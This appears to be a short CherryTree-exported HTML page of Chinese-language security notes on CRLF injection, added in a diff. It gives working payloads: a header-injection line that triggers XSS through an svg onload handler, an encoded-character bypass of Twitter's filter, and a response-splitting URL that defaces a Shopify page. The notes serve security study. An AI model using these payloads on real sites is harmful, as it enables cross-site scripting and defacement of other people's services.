@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>CRLF</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>CRLF</h1><br/><br />在cookie等地方尝试添加回车符号，使内容换行，并添加location，可以执行xss<br /><br />content-type:text/html（CRLF）<br />location:&lt;svg/onload=alert(innerHTML)&gt;<br /><br />Twtter的一个绕过<br /><br />Twitter在处理过程中，会先验证是否提交了禁止的字符<br />如果提交的数据是UTF-8编码过的，则会将其转为原始的unicode码后去掉一些无用字符后<br />再取剩下的字节，正是因为这样的逻辑导致了绕过<br />比如说用户提交的是：%E5%98%8A，这个不包含换行符所以不会被拦截，<br />服务器接收到后将其转成原始的unicode码：U+560A，最后取了0A，这时候就变成换行符了。<br /><br />普通的例子<br /><br />/last_shop?xxx.shopify.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a&lt;html&gt;deface&lt;/html&gt;<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
